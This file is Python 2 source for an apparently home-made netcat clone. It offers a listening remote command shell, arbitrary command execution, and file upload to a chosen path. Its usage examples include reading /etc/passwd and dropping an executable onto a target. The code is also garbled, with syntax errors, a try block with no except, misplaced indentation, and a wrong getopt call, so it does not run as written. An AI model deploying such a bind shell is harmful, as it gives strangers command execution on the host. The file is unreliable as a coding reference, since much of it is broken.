import sys
import socket
import getopt
import threading
import subprocess

# define globals
listen 				= False
command 			= False
upload 				= False
execute 			= ""
target 				= ""
upload_destination 	= ""
port 				= 0

def usage():
	print "Nachbar Net Tool"
	print
	print "Usage: NC.py -t <target host> -p <port>"
	print "-l --listen 					-Listen on [host]:[port] for incoming connections"
	print "-e --execute=file_to_run 	-Execute a given file upon connection"
	print "-c --command					-Initialize a command shell"
	print "-u --upload-destination 		-Upon recieving connection, upload and write file to [dest]"
	print
	print
	print "Examples:"
	print "NC.py -t 192.168.1.1 -p 5555 -c"
	print "NC.py -t 192.168.1.1 -p 5555 -u=c:\\target.exe"
	print "NC.py -t 192.168.1.1 -p 5555 -e=\"cat /etc/passwd\""
	sys.exit(0)

def client_sender(buffer):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		# connect to our target host
		client.connect((target, port))

		if len(buffer):
			client.send(buffer)

		while True:
			# now wait for data back
			recv_len = 1
			response = ""

			while recv_len:

				data 		= client.recv(4096)
				recv_len	= response+= data

				if recv_len < 4096:
					break

		print response,

		# wait for more input
		buffer = raw_input("")
		buffer += "\n"

		# ship it
		client.send(buffer)

	except:
		print "[*] Exception! Exiting."

		# rip it down
		client.close()


def server_loop():
	global target

	# if no target is defined, we listen on all interfaces
	if not len(target):
		target = "0.0.0.0"

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target,port))
	server.listen(5)

	while True
		client_socket, addr = server.accept()

		# spin up a thread to handle our new client
		client_thread = threading.Thread(target=client_handler,args=(client_socket,))
		client_thread.start()

def run_command(command):

	# trim the newline
	command = command.rstrip()

	# run the command and get the output back
	try:
		output = subprocess.check_output(command,stderr=subprocess, STDOUT, shell=True)
	except:
		output = "Failed to execute command.\r\n"

	# send output to client
	return output

def client_handler(client_socket):
	global upload_destination
	global execute
	global command

	# check for upload
	if len(upload_destination):
		# read all of they bytes and write to our destination
		file_buffer = ""

		# keep reading data until none availble

	while True:
		data = client_socket.recv(1024)

		if not data:
			break
		else:
			file_buffer += data

	# now we take these bytes and try to write them out
	try:
		file_descriptor = open(upload_destination,"wb")
		file_descriptor.write(file_buffer)
		file_descriptor.close()

		# awknowledge that we wrote the file out
		client_socket.send("Sucessfully save field to %s\r\n" % upload_destination)

	# check for command execution
	if len(execute):

		while True:
			# show simple prompt
			client_socket.send("NC:#> ")
			cmd_buffer = ""
			while "\n" not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)

			# return the command output
			response = run_command(cmd_buffer)

			# return response
			client_socket.send(response)


def main():
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target

	if not len(sys.argv[1:]):
		usage()

	# read the command line options
	try:
		opts, args = getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload"])
	except getopt.GetoptError as err:
		print str(err)
		usage()

	for o,a in opts:
		if o in ("-h", "--help"):
			usage()
		elif o in ("-l", "--listen"):
			listen = True
		elif o in ("-e", "--execute"):
			execute = a
		elif o in ("-c", "--command"):
			command = True
		elif o in ("-u", "--upload"):
			upload_destination = a
		elif o in ("-t", "--target"):
			target = a
		elif o in ("-p", "--port"):
			port = int(a)
		else:
			assert False,"Unhandled Exception"


	# are we going to listen or just send data from stdin?
	if not listen and len(target) and port > 0:

		# read in the buffer from the commandline
		# this will block, so send CTRL-D if not sending input
		# to stdin
		buffer = sys.stdin.read()

		# send data off
		client_sender(buffer)

	# we are going to listen and potentially 
	# upload things, execute commands, and drop a shell back
	# depending on our command line options above
	if listen:
		server_loop()


main()
